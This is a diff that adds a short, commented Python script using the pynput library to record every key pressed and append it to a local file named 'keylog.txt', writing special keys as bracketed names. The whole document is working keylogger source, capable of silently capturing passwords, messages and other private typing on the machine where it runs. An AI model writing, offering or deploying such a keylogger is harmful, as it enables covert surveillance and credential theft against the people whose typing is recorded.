@@ -1,0 +1,38 @@
+#!/usr/bin/python3
+
+from pynput.keyboard import Listener, Key
+
+# Write key presses to this file
+filename = "keylog.txt"
+
+def on_press(key):
+
+	# Open the file
+	f = open(filename, 'a')
+	
+	# Write the character pressed if available
+	if hasattr(key, 'char'):
+		f.write(key.char)
+	
+	# If space was pressed, write a space
+	elif key == Key.space:
+		f.write(' ')
+	
+	# If enter was pressed, write a new line
+	elif key == Key.enter:
+		f.write('\n')
+		
+	# If tab was pressed, write a tab
+	elif key == Key.tab:
+		f.write('\t')
+		
+	# If anything else was pressed, write [<key_name>]
+	else:
+		f.write('[' + key.name + ']')
+		
+	#close the file
+	f.close()
+	
+with Listener(on_press=on_press) as listener: # Setup the listener
+    listener.join() # Join individual key presses together
+    
